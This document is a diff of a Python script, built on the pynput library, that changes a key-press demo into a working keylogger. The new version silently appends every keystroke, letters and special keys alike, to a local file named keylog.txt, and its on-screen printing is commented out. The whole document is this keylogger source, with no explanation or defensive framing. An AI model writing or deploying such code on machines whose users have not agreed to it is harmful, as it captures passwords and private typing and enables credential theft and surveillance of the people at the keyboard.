@@ -1,11 +1,24 @@
 from pynput import keyboard
+import os
+import time
+
+file = open('keylog.txt', 'a')
+file.write('Start keylogging\n')
+file.close()
 
 def on_press(key):
+    file = open('keylog.txt', 'a')
     try:
-        print('key {0} pressed'.format(key.char))
+        key = key.char
+        #print(f'alphanumeric key {key} pressed')
+        file.write(f"{key}\n")
+        
     except AttributeError:
-        print('special key {0} pressed'.format(key))
+        #print(f'special key {key} pressed')
+        file.write(f"{str(key)}\n")
+    file.close()
         
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
-
+    
+   
